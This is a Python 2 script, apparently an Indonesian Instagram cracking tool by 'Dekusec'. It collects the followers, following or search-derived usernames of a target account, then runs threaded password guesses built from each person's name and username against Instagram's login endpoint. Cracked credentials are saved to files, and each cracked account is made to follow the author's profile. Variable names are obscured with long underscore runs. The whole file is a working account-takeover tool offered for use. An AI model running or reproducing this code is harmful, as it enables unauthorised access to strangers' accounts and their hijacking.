#!/usr/bin/python2
# coding=utf-8
# Fix By Dekusec
# Tool Instaram
# Versi 1.0

### IMPORT MODULE ###
import os, requests, re, json, random, sys, platform, base64,datetime, subprocess, time,calendar
from calendar import monthrange
from datetime import date
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor


errorsc = '01-01-2022'
# Blod Colors
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    

# High Intensity
HH = '\033[0;92m' 
HB = '\033[0;96m' 
H9 = '\033[0;90m'
HK = '\033[0;93m'
XXX = '\n' 

### GLOBAL NAME ###
IP = requests.get('https://api.ipify.org').text
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))

data_= []
hasil_ok = []
hasil_cp = []
c=1

status_foll =[]
data_followers = []
pencarian_ = []
hastag = []
________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________expired = ['02', '2', '2022']
________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________buffer_size = 898989



# INSTALL PAKET
try:
	import concurrent.futures
except ImportError:
	print("\n Modul Futures blom terinstall!...")
	os.system("pip install futures" if os.name == "nt" else "pip2 install futures")
try:
	import requests
except ImportError:
	print("\n Modul Requests blom terinstall!...")
	os.system("pip install requests" if os.name == "nt" else "pip2 install requests")
	
except:
	pass
url_instagram = "https://www.instagram.com/"
user_agentz = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"]
headerz = {"User-Agent": user_agentz}
headerz_api = {"User-Agent": user_agentz_api}

# KADARLUARSA
def login():
    os.system('clear')
    from datetime import datetime
    saat_ini = datetime.now()
    tgl1 = saat_ini.strftime("%d")
    bln = saat_ini.strftime("%m")
    thn = saat_ini.strftime("%Y")
    tanggal1 = thn + bln + tgl1
    lambdabot = ________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________expired[2] + ________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________expired[1] + ________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________expired[0]
    if tanggal1 >= lambdabot:
        print " SCRIPT KADARLUARSA%s [ %s ]\n"%(M,errorsc)
        os.system("rm -rf delet.txt")
        sys.exit()
    else:
    	kontol()
    
def kontol():
    os.system('clear')
    from datetime import datetime
    saat_ini = datetime.now()
    tgl1 = saat_ini.strftime("%d")
    bln = saat_ini.strftime("%m")
    thn = saat_ini.strftime("%Y")
    tanggal1 = thn + bln + tgl1
    lambdabot = ________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________expired[2] + ________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________expired[1] + ________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________expired[0]
    if float(tanggal1) + 1 == float(lambdabot):
        login_ig()

### HAPUS COOKIE ###
def logout_akun():
	try:
		os.system("del cookie.txt" if os.name == "nt" else "rm -f cookie.txt")
	except:
		pass
def logout_akunn():
	try:
		os.system("del cokiz.txt" if os.name == "nt" else "rm -f cokiz.txt")
	except:
		pass

# CEK COKI 
def cek_cokie():
	global cookie
	try:
		cok = open("cookie.txt", "r").read()
	except IOError:
		login_ig()
	else:	
		url = "https://i.instagram.com/api/v1/friendships/3995292966/followers/?count=5"
		with requests.Session() as ses_dev:
			try:
				login_coki = ses_dev.get(url, cookies={"cookie": cok}, headers=headerz_api)
				if "users" in json.loads(login_coki.content):
					cookie = {"cookie": cok}
				else:
					print"\n %s(%s3%s)%s Akun Instagram Chekpoint!"%(M)
					logout_akun()
					login_ig()	
			except ValueError:
				print"\n %s[!] akun terkena checkpoint!"%(M)
				logout_akun()
				login_ig()
None
# LOGIN IG 
def login_ig():
	global cookie
	os.system("clear")
	logo()
	print "\t\t     \033[7;36m( Login Instagram )%s"%(N)
	username_dev = raw_input("\n%s(%s•%s)%s Username instagram %s:%s "%(H,N,H,N,M,N))
	pass_dev = raw_input("%s(%s•%s)%s Password instagram %s:%s "%(H,N,H,N,M,N))
	try:
		try:
			headerz = {"User-Agent": user_agentz}
			with requests.Session() as dev:
				url_scrap = "https://www.instagram.com/"
				data = dev.get(url_scrap, headers=headerz).content
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
			header = {
					"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"X-CSRFToken": crf_token,
					"X-Requested-With": "XMLHttpRequest",
					"Referer": "https://www.instagram.com/accounts/login/",
					"User-Agent": user_agentz,
					 }
			param = {
					"username": username_dev,
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), pass_dev),
					"optIntoOneTap": False,
					"queryParams": {},
					"stopDeletionNonce": "",
					"trustedDeviceRecords": {}
					}
		except:
			header = {}
			param = {}
			pass
		with requests.Session() as ses_dev:
			url = "https://www.instagram.com/accounts/login/ajax/"
			respon = ses_dev.post(url, data=param, headers=header)
			data_dev = json.loads(respon.content)
			da = respon.cookies.get_dict()

			if "userId" in str(data_dev):
				
				print"\n%s(%s•%s)%s Berhasil login instagram"%(H,N,H,N)
				time.sleep(3)
				for dev in da:
					with open("cookie.txt", "a") as tulis:
						tulis.write(dev+"="+da[dev]+";")
				cok = open("cookie.txt","r").read()
				cookie = {"cookie": cok}

			elif "checkpoint_url" in str(data_dev):
				print"\n%s(%s•%s)%s Akun instagram checkpoint"%(H,N,H,N)

			elif "Please wait" in str(data_dev):
				print" %s[!] aktifkan mode pesawat 5 detik!"%(M)

			else:
				print m+"\n Gagal Login...."
				exit()
				
	except KeyboardInterrupt:
		exit()

# LOGO 
def logo():
	os.system("clear")
	print("""%s
	 ___           _          _____           _     
	|_ _|_ __  ___| |_ __ _  |_   _|__   ___ | |___ 
	 | || '_ \/ __| __/ _` |   | |/ _ \ / _ \| / __|
	 | || | | \__ \ || (_| |   | | (_) | (_) | \__ \\
	|___|_| |_|___/\__\__,_|   |_|\___/ \___/|_|___/%s
	
	                 \033[33mMade By Dekusec%s
 	   +-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+
           |\033[0;92mT\x1b[0m|\x1b[0;92mo\x1b[0m|\x1b[1;92mo\x1b[0m|\x1b[1;92ml\x1b[0m|\x1b[1;92ms\x1b[0m| |\x1b[1;92mU\x1b[0m|\x1b[1;92mn\x1b[0m|\x1b[1;92mt\x1b[0m|\x1b[1;92mu\x1b[0m|\x1b[1;92mk\x1b[0m| |\x1b[1;92mI\x1b[0m|\x1b[1;92mn\x1b[0m|\x1b[1;92ms\x1b[0m|\x1b[1;92mt\x1b[0m|\x1b[1;92ma\x1b[0m|\x1b[1;92mg\x1b[0m|\x1b[1;92mr\x1b[0m|\x1b[1;92ma\x1b[0m|\x1b[1;92mm\x1b[0m|
    	   +-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+\n
 """%(K,N,N))

# MENU TOOLS
def menu_dev():
	logo()
	print "       \033[7;36m( Menu Tools )%s"%(N)
	print("\n%s(%s1%s)%s Crack dari akun publik"%(HB,N,HB,N))
	print("%s(%s2%s)%s Crack dari pencarian"%(HB,N,HB,N))
	print("%s(%s3%s)%s Cek akun hasil crack"%(HB,N,HB,N))
	print("%s(%s0%s)%s Logout "%(HB,N,HB,N))
	pil = raw_input("\n%s(%s•%s)%s Pilih %s:%s "%(HB,N,HB,N,M,N))
	limit = ("100000")
	if pil == "1" or pil == "01":
		pas = ""
		status = ""
		username = raw_input("%s(%s•%s)%s Masukan username target %s:%s "%(HB,N,HB,N,M,N))
		info_dev(username, pas, status)

		print("\n [ pilih target crack satu² ]")
		print("\n%s(%s1%s)%s pengikutt %s %s: %s%s%s"%(HB,N,HB,N,username,M,H,str(pengikut),N))
		print("%s(%s2%s)%s mengikuti %s %s: %s%s%s"%(HB,N,HB,N,username,M,H,str(mengikuti),N))
		pil2=raw_input("\n%s(%s•%s)%s Pilih %s:%s "%(HB,N,HB,N,M,N))
		if pil2 == "1":
			data_follower_dev(cookie, id_, limit, pil2)
			print("\n%s(%s•%s)%s Hasil OK tersimpan di : ok.txt"%(HB,N,HB,N))
			print("%s(%s•%s)%s Hasil CP tersimpan di : cp.txt \n"%(HB,N,HB,N))
			crack()
		elif pil2 == "2":
			data_follower_dev(cookie, id_, limit, pil2)
			print("\n%s(%s•%s)%s Hasil OK tersimpan di : ok.txt"%(HB,N,HB,N))
			print("%s(%s•%s)%s Hasil CP tersimpan di : cp.txt \n"%(HB,N,HB,N))
			crack()
		else:
			pass
	elif pil == "2" or pil == "02":
		usr_ = raw_input("\n%s(%s•%s)%s Target nama      : "%(HB,N,HB,N))
		jm = input("%s(%s•%s)%s Masukan jumlah %s  :%s "%(HB,N,HB,N,M,N))
		star = raw_input("%s(%s•%s)%s Mulai Crack (%sy%s/%st%s)\x1b[1;31m: %s"%(HB,N,HB,N,HB,N,H,N,N))
		print("%s"%(XXX))
		if star in ["t", "T"]:
			print("%s(%s•%s)%s Kembali ke menu "%(HB,N,HB,N))
			time.sleep(3)
			menu_dev()
		us = usr_.replace(" ", "")
		pencarian_.append("iqbal_dev")
		data_.append(us+"==>"+us)
		data_.append(us+"_"+"==>"+us)
		for dev in range(1, jm+1):
			data_.append(us+str(dev)+"==>"+us)
			data_.append(us+"_"+str(dev)+"==>"+us)
			data_.append(us+str(dev)+"_"+"==>"+us)
		crack()
	elif pil == "3" or pil == "03":
		print("\n%s(%s1%s)%s Cek hasil %sOK%s"%(HB,N,HB,N,H,N))
		print("%s(%s2%s)%s Cek hasil %sCP%s"%(HB,N,HB,N,K,N))
		cek = raw_input("\n%s(%s•%s)%s Pilih %s:%s "%(HB,N,HB,N,M,N))
		if cek =="":
			menu_dev()
		elif cek == "1":
			dirs = os.listdir("OK")
			for file in dirs:
				None
				print("\n%s(%s•%s) \33[7;32m[ Copy and paste -> ]%s "%(HB,N,HB,N)+ file)
			try:
				file = raw_input("\n%s(%s•%s)%s Pilih %s:%s "%(HB,N,HB,N,M,N))
				if file == "":
					menu_dev()
				totalok = open("OK/%s"%(file)).read().splitlines()
			except IOError:
				exit("[!] file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print("\n%s(%s•%s)%s Total akun %sOK%s :%s %s"%(HB,N,HB,N,H,M,N, len(totalok)))
			print("%s"%(H))
			os.system("cat OK/%s"%(file))
			raw_input("\n%s(%s•%s)%s tekan enter untuk kembali ke menu "%(HB,N,HB,N))
			menu_dev()
		elif cek == "2":
			dirs = os.listdir("CP")
			for file in dirs:
				print("")
				print("%s(%s•%s)%s "%(HB,N,HB,N+ file))
			try:
				file = raw_input("\n%s(%s•%s)%s pilih nama file %s:%s "%(HB,N,HB,N,M,N))
				if file == "":
					menu_dev()
				totalcp = open("CP/%s"%(file)).read().splitlines()
			except IOError:
				exit("%s(%s•%s)%s File %s tidak tersedia"%(HB,N,HB,N,file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print("[#] ----------------------------------------------")
			print("[+] tanggal : %s total : %s"%(del_txt, len(totalcp)))
			print("%s"%(K))
			os.system("catCP/%s"%(file))
			raw_input("\n%s[•] tekan enter untuk kembali ke menu "%(N))
			menu_dev()
		else:
			menu_dev()
	elif pil == "0" or pil == "00":
		kel = raw_input("%s(%s•%s)%s jika logout anda harus login lagi (%sy%s/%st%s) \x1b[1;31m:%s "%(HB,N,HB,N,H,N,H,N,N))
		if kel in ["y", "Y"]:
			logout_akun()
			print "%s(%s•%s)%s Berhasil Logout"%(HB,N,HB,N)
			os.system("python2 insta.py")

### DUMP PUBLIK ###
def data_follower_dev(cookie, id_target, limit, opsi):
	global c
	if opsi == "1":
		url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}".format(id_target, limit)
	elif opsi == "2":
		url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}".format(id_target, limit)
	else:
		exit(" Error..")
	with requests.Session() as ses_dev:
		res_dat_foll = ses_dev.get(url, cookies=cookie, headers=headerz_api)
		for dev in json.loads(res_dat_foll.content)["users"]:
			username = dev["username"]
			nama = dev["full_name"].encode("utf-8")
			if len(status_foll) != 1:
				#print("\r [*] mengambil user : %s%s%s"%(H,len(data_),N)),
				#sys.stdout.flush()
				data_.append(username+"==>"+nama.decode("utf-8"))
				c+=1
			else:
				data_followers.append(username)
None

### DUMP PENCARIAN ###
def data_pencarian_dev(cookie, nama, limit):
	url = "https://www.instagram.com/web/search/topsearch/?count={}&context=blended&query={}&rank_token=0.21663777590422106&include_reel=true".format(limit,nama)
	with requests.Session() as ses_dev:
		res_dat_pencarian = ses_dev.get(url, cookies=cookie, headers=headerz)
		for dev in json.loads(res_dat_pencarian.content)["users"]:
			users = dev["user"]
			print " Username:",users["username"]
			print " Nama:",users["full_name"].encode("utf-8")
			print "-"*50
			
### DUMP QUERY ###
def hastag(cookie, nama, limit):
	url = "https://www.instagram.com/web/search/tags/topsearch/?count={}&context=blended&query={}&rank_token=0.21663777590422106&include_reel=true".format(limit,nama)
	with requests.Session() as ses_dev:
		res_dat_pencarian = ses_dev.get(url, cookies=cookie, headers=headerz)
		for dev in json.loads(res_dat_pencarian.content)["users"]:
			username = dev["username"]
			nama = dev["full_name"].encode("utf-8")
			if len(status_foll) != 1:
				#print("\r [*] mengambil user : %s%s%s"%(H,len(data_),N)),
				#sys.stdout.flush()
				data_.append(username+"==>"+nama.decode("utf-8"))
				c+=1
			else:
				data_followers.append(username)

### PW LIST ###
def crack():
	with ThreadPoolExecutor(max_workers=30) as insta_dev:
		for dataku in data_:
			try:
				pw = []
				data = dataku.encode("utf-8")
				dat_ = data.split("==>")[0]
				pw_ = data.split("==>")[1]
				pw_nam = pw_.split()

				if len(pencarian_) != 1:
					if len(dat_) >= 6:
						pw.append(dat_)
						if len(pw_nam[0]) <= 2:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)

						else:
							pw.append(pw_nam[0]+"123")
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)
		
					else:
						# pw.append(dat_+dat_)
						if len(pw_nam[0]) <= 2:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)

						else:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							pw.append(pw_nam[0]+"123")
							if len(pw_) >= 6:
								pw.append(pw_)
				else:
					pw.append(pw_nam[0]+"123")
					pw.append(pw_nam[0]+"12345")
					pw.append(dat_)

				insta_dev.submit(crack_dev, dat_, pw)
			except:
				pass

None

### CRACK ###
count_= 1
def crack_dev(username_dev, pass_dev_):
	global c, count_
	c_pw = len(pass_dev_)
	
	for pass_satu in pass_dev_:
		if c != 1:
			pass
		else:
			if len(status_foll) != 1:
				print("\r{}[•] [crack] {}/{} OK-:{} - CP-:{}".format(N,str(count_),len(data_),len(hasil_ok), len(hasil_cp))),
				sys.stdout.flush()
				c_pw -= 1
			else:
				pass
		
		try:
			if username_dev in hasil_ok or username_dev in hasil_cp:
				break
			pass_dev = pass_satu.lower()
			try:
				headerz = {"User-Agent": user_agentz_api}
				with requests.Session() as dev:
					url_scrap = "https://www.instagram.com/"
					data = dev.get(url_scrap, headers=headerz).content
					crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": crf_token,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,}
				param = {"username": username_dev,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pass_dev),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}}
			except:
				header = {}
				param = {}
				pass
			
			with requests.Session() as ses_dev:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses_dev.post(url, data=param, headers=header)
				data_dev = json.loads(respon.content)
				time.sleep(00.1)
				if "checkpoint_url" in str(data_dev):
					cp = "CP"
					info_dev(username_dev, pass_dev, cp)
					open("CP/%s.txt"%(tanggal),"a").write("[CP] %s|%s\n"%(username_dev, pass_dev))
					hasil_cp.append(username_dev)
					break
				elif "userId" in str(data_dev):
					live = "OK"
					if len(status_foll) != 1:
						info_dev(username_dev, pass_dev, live)
						open("OK/%s.txt"%(tanggal),"a").write("(OK) %s | %s\n"%(username_dev, pass_dev))
						hasil_ok.append(username_dev)
						follow_dev(ses_dev,username_dev)
					else:
						hasil_ok.append("dev_id")
						follow_dev(ses_dev,username_dev)
					break
				elif "Please wait" in str(data_dev):
					print("\r%s[!] IP anda terblokir, aktifkan mode pesawat 2 detik"%(M)),
					c+=1
					sys.stdout.flush()
					pass_dev_iq = [pass_dev]
					crack_dev(username_dev, pass_dev_iq)
					count_ -= 1
				else:
					c = 1
					pass
		except requests.exceptions.ConnectionError:
			print("\r%s[!] anda tidak terhubung ke internet"%(M)),
			sys.stdout.flush()
			c+=1
			pass_dev_iq = [pass_dev]
			crack_dev(username_dev, pass_dev_iq)
			count_ -= 1
		except:
			c = 1
			pass

	count_+=1
None

c_foll = 1
count_foll = 1
def follow_dev(ses_dev, username_dev):
	global c_foll, count_foll
	if len(status_foll) != 1:
		user_target = "dekusec"
		id_target = "3995292966"
	else:
		print("\r{}[•] [follow] {}/{} OK-:{} - CP-:{}".format(N,str(count_foll),len(data_),len(hasil_ok), len(hasil_cp))),
		sys.stdout.flush()
		user_target = username_get_follow
		id_target = id_

	dat_crf_foll = ses_dev.get("https://www.instagram.com/{}/".format(user_target), headers=headerz_api).content
	crf_token_foll = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(dat_crf_foll))[0]
	headerz_foll = {"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"Origin": "https://www.instagram.com",
					"Referer": "https://www.instagram.com/{}/".format(user_target),
					"User-Agent": user_agentz,
					"X-CSRFToken": crf_token_foll}
	param_foll = {""}
	url_follow = "https://www.instagram.com/web/friendships/{}/follow/".format(id_target)
	res_foll = ses_dev.post(url_follow, headers=headerz_foll)
	if len(status_foll) != 1:
		pass
	else:
		print("[✓] berhasil mengikuti")

def info_dev(username_dev, pass_dev, status):
	try:
		global id_, pengikut, mengikuti
		da = requests.get("https://www.instagram.com/{}/?__a=1".format(username_dev), headers={"User-Agent": user_agentz})
		data_us_dev = da.json()["graphql"]["user"]
		nama = data_us_dev["full_name"].encode("utf-8")
		id_ = data_us_dev["id"]
		pengikut = data_us_dev["edge_followed_by"]["count"]
		mengikuti = data_us_dev["edge_follow"]["count"]
		if status == "OK":
			print"\r"+HB+"("+N+"✓"+HB+")"+N+" Status   "+M+": "+H+status + "                 "
			print"\r"+HB+"("+N+"✓"+HB+")"+N+" Nama     "+M+": "+H+ str(nama) + "              "
			print"\r"+HB+"("+N+"✓"+HB+")"+N+" pengikut "+M+": "+H+ str(pengikut) + "              "
			print"\r"+HB+"("+N+"✓"+HB+")"+N+" mengikuti"+M+": "+H+ str(mengikuti) + "              "
			print"\r"+HB+"("+N+"✓"+HB+")"+N+" Username "+M+": "+H+ username_dev + "              "
			print"\r"+HB+"("+N+"✓"+HB+")"+N+" Password "+M+": "+H+ pass_dev + "             \n"
		elif status == "CP":
			print"\r"+HB+"("+N+"✓"+HB+")"+N+" Status   "+M+": "+K+status + "                 "
			print"\r"+HB+"("+N+"✓"+HB+")"+N+" Nama     "+M+": "+K+ str(nama) + "              "
			print"\r"+HB+"("+N+"✓"+HB+")"+N+" pengikut "+M+": "+K+ str(pengikut) + "              "
			print"\r"+HB+"("+N+"✓"+HB+")"+N+" mengikuti"+M+": "+K+ str(mengikuti) + "              "
			print"\r"+HB+"("+N+"✓"+HB+")"+N+" Username "+M+": "+K+ username_dev + "              "
			print"\r"+HB+"("+N+"✓"+HB+")"+N+" Password "+M+": "+K+ pass_dev + "             \n"
		else:
			pass
	except:
		pass

None

def buatfolder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__=="__main__":
	login()
	buatfolder()
	cek_cokie()
	menu_dev()



